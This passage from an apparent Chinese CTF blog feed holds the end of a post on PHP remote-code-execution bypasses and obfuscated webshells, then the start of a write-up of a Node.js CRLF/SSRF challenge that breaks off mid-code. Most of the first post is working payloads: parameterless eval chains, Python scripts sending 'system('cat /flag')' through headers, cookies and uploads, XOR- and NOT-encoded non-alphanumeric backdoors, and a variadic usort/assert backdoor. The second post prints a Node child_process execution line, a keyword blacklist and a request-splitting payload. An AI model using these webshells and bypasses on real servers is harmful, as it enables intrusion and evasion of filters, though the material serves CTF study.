]</code>是linux的条件表达式符号。使用base32是因为我们的返回值可能有特殊字符。<br>这样就完全可以依靠盲打脚本来进行命令执行。</p><p>关于linux命令还有些tricks 没有提到，一方面是因为自己了解的毕竟是有限的。另一方面是因为下面的内容中将继续使用到。关于php结合linux命令的一些tricks。</p><h1 id="php-RCE-bypass-amp-花式写shell"><a href="#php-RCE-bypass-amp-花式写shell" class="headerlink" title="php RCE bypass &amp; 花式写shell"></a>php RCE bypass &amp; 花式写shell</h1><p>php中的RCE方式可不少。通常最大的难点是写一个webshell出来。而写出webshell后执行命令也会遇到禁用系统函数的情况。这种时候就有许许多多的高级技巧。不仅仅是php的特性问题了，还有许多高级构造。</p><h2 id="无参RCE"><a href="#无参RCE" class="headerlink" title="无参RCE"></a>无参RCE</h2><p>  之所以把无参RCE放到这一块。就是因为无参RCE的利用主要依靠php函数达成。所以小结下常见trick。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[^\W]+\((?R)?\)/'</span>, <span class="string">''</span>, $_GET[<span class="string">'code'</span>])) &#123;    </span><br><span class="line">    <span class="keyword">eval</span>($_GET[<span class="string">'code'</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最早出自于p牛的easyphplimit<a href="https://www.jianshu.com/p/19a37402554f" target="_blank" rel="noopener">https://www.jianshu.com/p/19a37402554f</a>我还在GXYCTF中复现同为无参RCE的题目<a href="https://www.jianshu.com/p/2b5e7bd64264" target="_blank" rel="noopener">https://www.jianshu.com/p/2b5e7bd64264</a><br>其实无参RCE的主要要点就是只能执行如下类型函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a(b(c()));</span><br><span class="line">a();</span><br></pre></td></tr></table></figure><p>个人第一习惯首先是使用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print_r(scandir(<span class="string">'.'</span>))</span><br></pre></td></tr></table></figure><p>探测目录。但此处显然<code>.  &#39;&#39;</code>都使用不了。那么怎么构造呢？我们可以轻松使用函数达成</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print_r(scandir(current(localeconv())));</span><br></pre></td></tr></table></figure><p><code>localeconv</code>返回一个数组。其数组头一个值为<code>decimal_point</code>，也就是一个点。 <code>current()</code>起到取出数组第<br>一个变量的作用，所以可以以此替代scandir要用的点。<br>还有一种常规点的做法，只需<code>getcwd()</code>即可返回目录。而<code>dirname()</code>可以往目录上跳。当然，如果想读取的文件在上级目录，就得再加上一个<code>chdir()</code><br>比如code-breakng的payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readfile(next(array_reverse(scandir(dirname(chdir(dirname(getcwd())))))));</span><br></pre></td></tr></table></figure><p>其中用到的array_reverse()也是为了应对flag的数组索引不是特殊索引的情况。调整后使用<code>current, next，end</code>可以解决大部分问题。</p><p>当然这类无参RCE还有其他用法，比如：<br>1.<code>getenv()</code>函数<br>这一函数将返回一个环境变量的值，而我们需要的是从这个数组中选取需要的值进行利用。<br>常常是：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array_rand(array_flip(getenv()));</span><br></pre></td></tr></table></figure><p>可以随机获取数组中某一个键值。爆破之后能拿到数组中指定值</p><p>2.<code>getallheaders()</code></p><p>从http头中获取值。因此十分便捷。比如当http头最后一个值使我们构造好的<code>byc: phpinfo()</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump(end(getallheaders()));</span><br></pre></td></tr></table></figure><p>如此即可执行<code>phpinfo()</code><br>但是注意，这是个apache函数，如果遇到nginx将不再适用。<br>3.<code>get_defined_vars()</code><br>正是为了应对getallheaders的缺陷，我们可以选择<code>get_defined_vars()</code>。因为它返回的将是全局变量，全局变量包括<code>$_GET  $_POST</code>都是可以直接使用的。这样我们就多了一个可以执行命令的函数。比如取出了_GET的话。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=<span class="keyword">eval</span>(end(current(get_defined_vars())));&amp;byc=system(<span class="string">'ls'</span>);</span><br></pre></td></tr></table></figure><p>甚至我们也能利用<code>$_FILES</code>，通过伪造文件上传达成调用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"system('cat /flag');"</span>.encode(<span class="string">'hex'</span>)</span><br><span class="line">files = &#123;</span><br><span class="line">  payload: BytesIO(<span class="string">'2333!'</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r = requests.post(<span class="string">'http://localhost/shell.php?cmd=eval(hex2bin(array_rand(end(get_defined_vars()))));'</span>, files=files, allow_redirects=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> (r.text)</span><br></pre></td></tr></table></figure><p>使用hex2bin是为了防止关键字的过滤或转换。</p><p>4.<code>session_id()</code>函数</p><p>与上面的全局变量同样的道理。只不过我们可以利用php的特性。只要是<code>PHPSESSID</code>后的值，就可以直接赋给<code>session_id</code>。既然如此我们只需解决<code>session_id</code>值为字母加数字的问题了。同样使用<code>hex2bin</code>即可<br>前提条件是要先session_start()</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">'http://localhost/shell.php?cmd=eval(hex2bin(session_id(session_start())));'</span></span><br><span class="line">payload = <span class="string">"echo '23333';"</span>.encode(<span class="string">'hex'</span>)</span><br><span class="line">cookies = &#123;</span><br><span class="line"><span class="string">'PHPSESSID'</span>:payload</span><br><span class="line">&#125;</span><br><span class="line">r = requests.get(url=url,cookies=cookies)</span><br><span class="line"><span class="keyword">print</span> (r.text)</span><br></pre></td></tr></table></figure><h2 id="花式写shell"><a href="#花式写shell" class="headerlink" title="花式写shell"></a>花式写shell</h2><p>花式写shell算是php一个十分考验技巧的点了。当然之前上面linux部分所写的bypass长度也算花式写shell。但是那主要利用的是linux的特性。我们这里尝试使用php的特性，写几种最常见的webshell</p><p>1.常规拆分</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=`$_GET[<span class="number">1</span>]`;&amp;<span class="number">1</span></span><br></pre></td></tr></table></figure><p>基本算是用烂了，也是我这种菜鸡最喜欢用的类型。相当与写一个一句话木马。</p><p>2.include<br> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=<span class="keyword">include</span>$_GET[<span class="number">1</span>];</span><br></pre></td></tr></table></figure><br>很妙，但是可能会受限于远程文件包含。这个选项默认是不开启的。</p><p>3.include升级版<br>为了解决这一问题，我们可以尝试本地文件包含。为此只要<code>file_put_contents()</code>写入一个文件即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_GET[a](N,a,8);&amp;a&#x3D;file_put_contents</span><br></pre></td></tr></table></figure><p>其中<code>file_put_contents</code>的第一个参数是文件名。PHP会认为N是一个常量，但之前并没有定义这个常量，于是PHP就会把它转换成字符串’N’；第二个参数是要写入的数据，a也被转换成字符串’a’；第三个参数是flag，当flag=8的时候内容会追加在文件末尾，而不是覆盖。<br>由于写入符号时函数会报错，可以选择写入payload的base64,分次写入，最后伪协议包含：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=<span class="keyword">include</span>$_GET[<span class="number">0</span>];&amp;<span class="number">0</span>=php:<span class="comment">//filter/read=convert.base64-decode/resource=N</span></span><br></pre></td></tr></table></figure><p>4.变长参数+回调后门</p><p>p牛给出的无视waf的神招。利用了php5.6的特性。</p><p>在PHP中可以使用 <code>func(...$arr)</code>这样的方式，将$arr数组展开成多个参数，传入func函数。<br>所以可以</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=usort(...$_GET);</span><br></pre></td></tr></table></figure><p>以下参数get传值。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>[]=test&amp;<span class="number">1</span>[]=phpinfo();&amp;<span class="number">2</span>=assert</span><br></pre></td></tr></table></figure><p>p牛解释是：</p><blockquote><p>大概过程就是，GET变量被展开成两个参数[‘test’, ‘phpinfo();’]和assert，传入usort函数。usort函数的第二个参数是一个回调函数assert，其调用了第一个参数中的phpinfo();。修改phpinfo();为webshell即可。</p></blockquote><p>这个做法最妙的就是<code>...$_GET</code>绕过waf。</p><h2 id="写畸形shell"><a href="#写畸形shell" class="headerlink" title="写畸形shell"></a>写畸形shell</h2><h3 id="php的某些特性"><a href="#php的某些特性" class="headerlink" title="php的某些特性"></a>php的某些特性</h3><p>应该说要先熟悉一下php中大括号的妙处,可变变量的妙处</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="string">"hello"</span>;</span><br><span class="line">$$a=<span class="string">"world"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"$a $&#123;$a&#125;"</span>;<span class="comment">//hello world</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"$a $hello"</span>;<span class="comment">//hello world</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;&quot;_GET&quot;&#125;&#x3D;&#x3D;&#x3D;&#x3D;&gt;$_GET</span><br></pre></td></tr></table></figure><p>同时在<code>${}</code>中，字符串如果不带<code>&#39;&#39; ,&quot; &quot;</code>。并不会影响生成以其为名的变量</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php &gt; <span class="variable">$a</span>=1111;</span><br><span class="line">php &gt; var_dump(<span class="variable">$&#123;a&#125;</span>);</span><br><span class="line">PHP Warning:  Use of undefined constant a - assumed <span class="string">'a'</span> (this will throw an Error <span class="keyword">in</span> a future version of PHP) <span class="keyword">in</span> php shell code on line 1</span><br></pre></td></tr></table></figure><p>假如我们换成字符串，就会发现它在<code>${}</code>中是会被解析的。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$a=<span class="string">'b'</span></span><br><span class="line">$&#123;$a&#125;=&gt;$b</span><br><span class="line">var_dump($&#123;$a&#125;);=&gt;var_dump($b);</span><br><span class="line">$b=<span class="string">'1'</span>=&gt;string(<span class="number">1</span>) <span class="string">"1"</span></span><br></pre></td></tr></table></figure><p>因此我们可以明白：<br><code>$$</code>或<code>${}</code>能利用一个字符串创造出一个同名变量。变量名只能包含字母数字字符以及下划线；但是<code>${}</code>可以使得只包含数字，比如<code>${1}</code>。此时<code>${1}</code>就变成了一个变量。</p><h3 id="各种方法"><a href="#各种方法" class="headerlink" title="各种方法"></a>各种方法</h3><ol><li>异或<br>这个方法很常见，但是自己还没在实际比赛中用到过……<br>一个非数字字母的后门<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    @$_++; <span class="comment">// $_ = 1</span></span><br><span class="line">    $__=(<span class="string">"#"</span>^<span class="string">"|"</span>); <span class="comment">// $__ = _</span></span><br><span class="line">    $__.=(<span class="string">"."</span>^<span class="string">"~"</span>); <span class="comment">// _P</span></span><br><span class="line">    $__.=(<span class="string">"/"</span>^<span class="string">"`"</span>); <span class="comment">// _PO</span></span><br><span class="line">    $__.=(<span class="string">"|"</span>^<span class="string">"/"</span>); <span class="comment">// _POS</span></span><br><span class="line">    $__.=(<span class="string">"&#123;"</span>^<span class="string">"/"</span>); <span class="comment">// _POST </span></span><br><span class="line">    $&#123;$__&#125;[!$_]($&#123;$__&#125;[$_]); <span class="comment">// $_POST[0]($_POST[1]);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">$__=(<span class="string">"#"</span>^<span class="string">"|"</span>).(<span class="string">"."</span>^<span class="string">"~"</span>).(<span class="string">"/"</span>^<span class="string">"`"</span>).(<span class="string">"|"</span>^<span class="string">"/"</span>).(<span class="string">"&#123;"</span>^<span class="string">"/"</span>);</span><br></pre></td></tr></table></figure>其实异或就是字符的ascii转二进制异或后再转ascii转字符串。</li></ol><p>2.取反<br>能异或就能取反。位运算牛b。比如p牛的这个例子：<br><code>&#39;和&#39;{2}</code>的结果<code>&quot;\x8c&quot;</code>取反是<code>s</code><br>这里还利用了php中数组可以使用<code>{}</code>替换<code>[]</code>的性质。<br>“和”的第三个字节的值为140[0x8c]，取反的值为-141。<br>负数用十六进制表示，通常用的是补码的方式表示。负数的补码是它本身的值每位求反,最后再加一。141的16进制为0xff73，php中chr(0xff73)==115，115就是s的ASCII值。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(shell)</span>:</span></span><br><span class="line">        hexbit=<span class="string">''</span>.join(map(<span class="keyword">lambda</span> x: hex(~(-(<span class="number">256</span>-ord(x)))),shell))</span><br><span class="line">       print(hexbit)</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php &gt; <span class="keyword">echo</span>(~(<span class="string">"\x8f\x97\x8f\x96\x91\x99\x90"</span>));</span><br><span class="line">phpinfo</span><br></pre></td></tr></table></figure><p>3.自增运算符<br>自增运算符构造数字也是技巧</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$_++;</span><br><span class="line"><span class="keyword">print</span>($_);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>$_=(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)+(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)</code>也是可以得到<code>2</code>的。这点还可以构造数组键值。</p><p>4.短标签+通配符</p><p>之前在ciscn中遇到过。一个<code>&lt;?php?&gt;</code>算是php的长标签，而<code>&lt;?=?&gt;</code>算短标签。但是这样就可以执行函数了，而且可以通过fuzz达到任意命令执行的效果。由于linux中可以用<code>?</code>来进行单个字母的匹配：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>=`/???/???%20/???/???/????/?????.???`;?&gt;&lt;?=<span class="variable">$_</span>?&gt;</span><br><span class="line">/bin/cat /var/www/html/index.php</span><br></pre></td></tr></table></figure><p>实际上是应用了linux的glob通配符的作用。既然<code>`</code>可以内联执行。只要能匹配完全就可以达到写shell命令执行的效果。<br>当然，符合匹配结果的命令可能有多个。我们可以加上其他通配符</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[^x] 表示这个位置不是字符x</span><br><span class="line">[0-9] 表示数字范围</span><br><span class="line">[@-[]表示大写字母</span><br></pre></td></tr></table></figure><p>假如匹配到，我们就可以任意命令执行了。</p><p>5.php7 动态函数 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(~%8F%97%8F%96%91%99%90)();</span><br><span class="line">&#x2F;&#x2F;phpinfo()</span><br></pre></td></tr></table></figure><p>php7就支持使用<code>($a)();</code>这样的方法来执行动态函数的</p><p>暂且写这么多吧。毕竟php的奇妙之处太多了，一时半会是总结不完的。<br>这周末就是第一次以X1c的队员身份打比赛了，要加油啊。</p><p>参考文章：</p><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a></p><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a><br><a href="https://www.leavesongs.com/PHP/bypass-eval-length-restrict.html" target="_blank" rel="noopener">https://www.leavesongs.com/PHP/bypass-eval-length-restrict.html</a><br><a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/" target="_blank" rel="noopener">https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/</a><br><a href="https://skysec.top/2017/12/29/Time-Based-RCE/" target="_blank" rel="noopener">https://skysec.top/2017/12/29/Time-Based-RCE/</a><br><a href="https://www.smi1e.top/php%E4%B8%8D%E4%BD%BF%E7%94%A8%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8D%E5%92%8C%E4%B8%8B%E5%88%92%E7%BA%BF%E5%86%99shell" target="_blank" rel="noopener">https://www.smi1e.top/php%E4%B8%8D%E4%BD%BF%E7%94%A8%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8D%E5%92%8C%E4%B8%8B%E5%88%92%E7%BA%BF%E5%86%99shell</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> WEB </tag>
            
            <tag> PHP </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>单独填坑-公益赛NodeGame</title>
      <link href="2020/02/26/%E5%8D%95%E7%8B%AC%E5%A1%AB%E5%9D%91-%E5%85%AC%E7%9B%8A%E8%B5%9BNodeGame/"/>
      <url>2020/02/26/%E5%8D%95%E7%8B%AC%E5%A1%AB%E5%9D%91-%E5%85%AC%E7%9B%8A%E8%B5%9BNodeGame/</url>
      
        <content type="html"><![CDATA[<p>  今天来填下NodeGame的坑吧。这道题确实出的很难。记得当时比赛中也只有大概8位师傅做出来。而实际上，很多师傅应该都是有思路与参考题目，但是最终被小细节所影响的。<br>这里给出出题人自己的出题思路：<a href="http://blog.5am3.com/2020/02/11/ctf-node1/#%E8%87%AA%E5%B7%B1%E5%87%BA%E7%9A%84-node-game" target="_blank" rel="noopener">http://blog.5am3.com/2020/02/11/ctf-node1/#%E8%87%AA%E5%B7%B1%E5%87%BA%E7%9A%84-node-game</a><br>其中一道他参考的国际赛题目wp:<br><a href="https://r3billions.com/writeup-split-second/" target="_blank" rel="noopener">https://r3billions.com/writeup-split-second/</a></p><a id="more"></a><h1 id="nullcon-hackim-2020-split-second"><a href="#nullcon-hackim-2020-split-second" class="headerlink" title="nullcon hackim-2020 split-second"></a>nullcon hackim-2020 split-second</h1><p>题目源码我fork后单独放在自己github上，有需要自取<br><a href="https://github.com/baiyecha404/hackim-web" target="_blank" rel="noopener">https://github.com/baiyecha404/hackim-web</a></p><p>先讲解下出题人师傅参考的那道国际赛的题目吧。<br>首先题目的路由跟我们这道NodeGame基本一致，首先从flag路由可以看到</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">app.get(<span class="string">'/flag'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> ip = req.connection.remoteAddress;</span><br><span class="line">    <span class="keyword">if</span> (ip.includes(<span class="string">'127.0.0.1'</span>)) &#123;</span><br><span class="line">        <span class="keyword">var</span> authheader = req.headers[<span class="string">'adminauth'</span>];</span><br><span class="line">        <span class="keyword">var</span> pug2 = <span class="built_in">decodeURI</span>(req.headers[<span class="string">'pug'</span>]);</span><br><span class="line">        <span class="keyword">var</span> x=pug2.match(<span class="regexp">/[a-z]/g</span>);</span><br><span class="line">        <span class="keyword">if</span>(!x)&#123;</span><br><span class="line">         <span class="keyword">if</span> (authheader === <span class="string">"secretpassword"</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> html = pug.render(pug2);</span><br><span class="line">         &#125;</span><br><span class="line">        &#125;</span><br><span class="line">       <span class="keyword">else</span>&#123;</span><br><span class="line">        res.send(<span class="string">"No characters"</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">     res.send(<span class="string">"You need to come from localhost"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>core路由是：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">app.get(<span class="string">'/core'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> q = req.query.q;</span><br><span class="line">    <span class="keyword">var</span> resp = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">if</span> (q) &#123;</span><br><span class="line">        <span class="keyword">var</span> url = <span class="string">'http://localhost:8081/getMeme?'</span> + q</span><br><span class="line">        <span class="built_in">console</span>.log(url)</span><br><span class="line">        <span class="keyword">var</span> trigger = blacklist(url);</span><br><span class="line">        <span class="keyword">if</span> (trigger === <span class="literal">true</span>) &#123;</span><br><span class="line">            res.send(<span class="string">"&lt;p&gt;Errrrr, You have been Blocked&lt;/p&gt;"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                http.get(url, <span class="function"><span class="keyword">function</span>(<span class="params">resp</span>) </span>&#123;</span><br><span class="line">                    resp.setEncoding(<span class="string">'utf8'</span>);</span><br><span class="line">                    resp.on(<span class="string">'error'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">err</span>) </span>&#123;</span><br><span class="line">                    <span class="keyword">if</span> (err.code === <span class="string">"ECONNRESET"</span>) &#123;</span><br><span class="line">                     <span class="built_in">console</span>.log(<span class="string">"Timeout occurs"</span>);</span><br><span class="line">                     <span class="keyword">return</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                   &#125;);</span><br><span class="line"></span><br><span class="line">                    resp.on(<span class="string">'data'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">chunk</span>) </span>&#123;</span><br><span class="line">                        resps = chunk.toString();</span><br><span class="line">                        res.send(resps);</span><br><span class="line">                    &#125;).on(<span class="string">'error'</span>, (e) =&gt; &#123;</span><br><span class="line">                         res.send(e.message);&#125;);</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">                <span class="built_in">console</span>.log(error);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.send(<span class="string">"search param 'q' missing!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>还有一个黑名单函数</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params">url</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> evilwords = [<span class="string">"global"</span>, <span class="string">"process"</span>,<span class="string">"mainModule"</span>,<span class="string">"require"</span>,<span class="string">"root"</span>,<span class="string">"child_process"</span>,<span class="string">"exec"</span>,<span class="string">"\""</span>,<span class="string">"'"</span>,<span class="string">"!"</span>];</span><br><span class="line">    <span class="keyword">var</span> arrayLen = evilwords.length;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; arrayLen; i++) &#123;</span><br><span class="line">        <span class="keyword">const</span> trigger = url.includes(evilwords[i]);</span><br><span class="line">        <span class="keyword">if</span> (trigger === <span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以上就是源码中重要部分。除此以外还要先明确一点，题目使用的是Nodejs8.12.版本。并且使用pug作为模板引擎。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">var</span> app = express();</span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"><span class="keyword">var</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>);</span><br><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</span><br><span class="line"><span class="keyword">var</span> pug = <span class="built_in">require</span>(<span class="string">'pug'</span>);</span><br></pre></td></tr></table></figure><p>这个版本的Nodejs存在什么漏洞呢？如果去搜索会发现存在一个CVE,类型为CRLF injection。具体利用之后再提。现在我们来分析下上述源码的重要之处：<br>1./flag 这是我们的最终目的。一个重点是要达成<code>ip.includes(&#39;127.0.0.1)</code>。说明我们可能需要构造一个ssrf.在ip检查后，还有另一个条件<code>authheader === &quot;secretpassword&quot;</code>进行了http头的检查，达成后将进行<code>pug</code>的渲染，说明可能达成Nodejs的命令执行。而既然要对头进行检查，说明我们确实可能需要CRLF漏洞来进行http头的伪造。</p><p>2.core路由允许我们传递参数q。之后与<code>http://localhost:8081/getMeme?</code>拼接，整个url经过一次黑名单检查后将执行。所以上面所需的ssrf在这已经帮我们准备好了。只需考虑绕过即可</p><p>3.黑名单<br>从其中存在的关键字就可看出，这是Nodejs常见的命令执行的模板。我们以前用过的Nodejs命令执行payload:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">global.process.mainModule.require(<span class="string">'child_process'</span>).exec(<span class="string">'ls'</span>)</span><br></pre></td></tr></table></figure><p>将不能直接传入。显然这里需要其他途径来编码绕过。</p><p>既然如此我们来复现下,vps上搭好环境：<br>我们的CRLF漏洞，允许我们通过换行构造headers。同时也可以构造拆分ssrf。利用换行结束前一个请求，并发送另一个请求：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;core?q&#x3D;x HTTP&#x2F;1.1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">GET &#x2F;flag HTTP&#x2F;1.1</span><br><span class="line">adminauth: secretpassword</span><br><span class="line">pug: - xxx</span><br></pre></td></tr></table></figure><p>那么明确我们需要伪造的文件头</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 